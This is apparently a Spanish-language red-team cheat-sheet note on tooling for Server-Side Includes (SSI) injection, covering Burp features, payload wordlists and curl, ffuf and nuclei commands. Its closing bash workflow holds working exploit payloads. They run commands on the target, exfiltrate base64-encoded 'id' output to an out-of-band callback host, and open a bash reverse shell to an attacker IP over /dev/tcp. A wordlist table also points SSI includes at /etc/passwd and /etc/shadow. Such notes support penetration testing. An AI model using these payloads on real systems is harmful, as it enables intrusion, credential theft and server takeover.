---
aliases:
  - SSI Tooling
  - SSI Wordlists
  - Burp SSI
tags:
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
  - "[[Burp Suite]]"
---
# SSI - Tooling

---

## Burp Intruder + Active Scan

| **Acción / Feature** | **Qué hace** | **Cuándo** |
|---|---|---|
| Active Scanner | Burp Pro detecta SSI automáticamente | Built-in (Pro) |
| BCheck rules | Reglas custom para SSI | Pro |
| Send to Intruder (Sniper) | Fuzz de una posición con payloads SSI | Por input |
| Match/Extract | Grepea `uid=` / `[an error occurred]` en la respuesta | Validar hits |
| Send to Repeater | Fine-tuning manual del payload | Standard |
| Param Miner | Descubre params ocultos en `.shtml` | Recon |
| Collaborator | Confirma RCE ciego (OOB) | Blind |
| Comparer | Diff de respuesta normal vs payload | Visual |

^ssi-tool-burp

---

## Wordlists

| **Wordlist** | **Path / Source** | **Uso** |
|---|---|---|
| PayloadsAllTheThings - SSI | `github.com/swisskyrepo/PayloadsAllTheThings` → `Server Side Include Injection` | Payloads de inyección |
| Burp Intruder built-in | Payload set "SSI Injection" | Pro |
| File path wordlist | `/etc/passwd`, `/etc/shadow`, `config.php`… | Para `#include` |
| Directivas comunes | `exec`, `include`, `echo`, `printenv`, `fsize`, `flastmod` | Cobertura de directives |
| Variantes de bypass | whitespace / comillas / encoding | Evasión de filtros |
| OOB callbacks | Burp Collaborator / interactsh URLs | Detección ciega |

^ssi-tool-wordlists

---

## Manual curl / Custom Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `curl --data-urlencode 'q=<!--#echo var="DATE_LOCAL" -->' https://target/search.shtml` | Confirma SSI (renderiza fecha) | Probe pasivo |
| `curl --data-urlencode 'q=<!--#exec cmd="curl <id>.oast.fun" -->' https://target/search.shtml` | Confirma RCE ciego (OOB) | Blind |
| `ffuf -u 'https://target/page.shtml?q=FUZZ' -w ssi-payloads.txt -mr 'uid='` | Fuzz de payloads SSI con match `uid=` | Bulk |
| `nuclei -t vulnerabilities/ssi-injection.yaml -u target` | Scan con template de nuclei | Bulk scan |
| `for w in $(cat ssi-payloads.txt); do curl --data-urlencode "q=$w" "$T"; done` | Test de wordlist completa | Bulk manual |
| `gau target \| httpx -mc 200 \| grep .shtml` | Descubre `.shtml` vivos | Recon previo al fuzz |

^ssi-tool-curl

### Manual workflow

```bash
TARGET="https://target/page.shtml"
PARAM="q"

# Probe 1: Date (passive)
PAYLOAD='<!--#echo var="DATE_LOCAL" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -oE '[A-Z][a-z]+,\s+[0-9]+' | head -1

# Probe 2: Server fingerprint
PAYLOAD='<!--#echo var="SERVER_SOFTWARE" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -oE 'Apache/[0-9.]+|Microsoft-IIS/[0-9.]+'

# Probe 3: RCE confirm
PAYLOAD='<!--#exec cmd="id" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -oE 'uid=[0-9]+'

# Probe 4: OOB blind
COLLAB="$(./interactsh-client -url-only)"
PAYLOAD="<!--#exec cmd=\"curl http://${COLLAB}/?d=\$(id|base64 -w0)\" -->"
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}"
# Watch interactsh dashboard for callback

# Probe 5: Reverse shell
PAYLOAD='<!--#exec cmd="bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}"
# Atacante: nc -lvnp 4444
```

---
